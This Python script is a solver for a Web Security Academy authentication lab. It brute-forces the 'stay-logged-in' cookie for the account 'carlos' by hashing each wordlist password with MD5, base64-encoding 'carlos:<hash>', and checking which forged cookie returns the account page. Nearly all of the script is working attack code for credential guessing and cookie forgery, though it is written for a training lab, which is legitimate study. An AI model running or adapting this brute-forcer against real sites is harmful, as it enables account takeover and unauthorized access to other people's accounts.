#!/usr/bin/env python3 

import requests
import urllib3
import argparse
import subprocess
import hashlib
import base64
from rich.console import Console
from rich.progress import Progress
from rich import print
import sys
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""Authentication Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net"

First download auth-lab-passwords and rename it to passwords.txt 
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
s = requests.Session()

def get_session(url):
    r = requests.get(url, verify=False)
    sess_line = str(r.cookies)
    spl_sess1 = sess_line.split("session=", 1)[1]
    global sess
    sess = spl_sess1.split(" ", 1)[0]
    return sess

def brute_force(s, url, sess):
    login_path = '/my-account'
    with open('passwords.txt') as g:
        pwd = g.readlines()
    console = Console()
    with Progress(transient = False) as progress:
        task = progress.add_task("[green][+] Processing...", total=100)
        for i in pwd:
            progress.advance(task)
            stri = i.strip('\n')
            hash = hashlib.md5()
            hash.update(bytes(stri, 'utf-8'))
            md5 = "carlos:" + hash.hexdigest()
            sample_string_bytes = md5.encode("ascii")
            base64_bytes = base64.b64encode(sample_string_bytes)
            base64_string = base64_bytes.decode("ascii")
            headers = {
                "Cookie": "session=" + sess + "; stay-logged-in=" + base64_string
            }
            if args.proxy:
                args.proxy=str(args.proxy)
                proxies = {
                    'http': 'http://' + args.proxy,
                    'https': 'http://' + args.proxy,
                } 
                s.get(url + login_path, verify=False, headers=headers, proxies=proxies)
                sys.exit(0)
            else:
                r = s.get(url + login_path, verify=False, headers=headers, allow_redirects=False)
                if (r.status_code == 200):
                    print("The password for carlos is: " + stri)
                    subprocess.call(["firefox", url])
                    sys.exit("(+) Authentication Successful!")
                else: 
                    pass

def main():
    
    print("(+) Exploiting Authentication")

    get_session(url)
    
    brute_force(s, url, sess)

if __name__ == "__main__":
    main()
